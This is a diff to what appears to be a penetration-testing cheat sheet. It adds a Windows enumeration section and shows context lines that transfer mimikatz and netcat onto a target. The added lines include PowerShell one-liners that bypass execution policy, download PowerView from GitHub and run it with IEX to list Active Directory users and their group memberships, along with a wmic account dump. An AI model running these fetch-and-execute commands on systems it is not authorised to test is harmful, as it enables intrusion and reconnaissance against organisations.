@@ -111,5 +111,14 @@ Log injection
 - `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`
 - `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`
 
+###### Basic windows Enumeration
+
+Check Windows Patches
+- powershell.exe -command Get-HotFix
+
+Display all AD Users and associated info
+-  powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Get-User
+-  powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Get-UserProperties -Properties name,memberof,description,info
+-  wmic useraccount get/ALL /format:csv
 
 
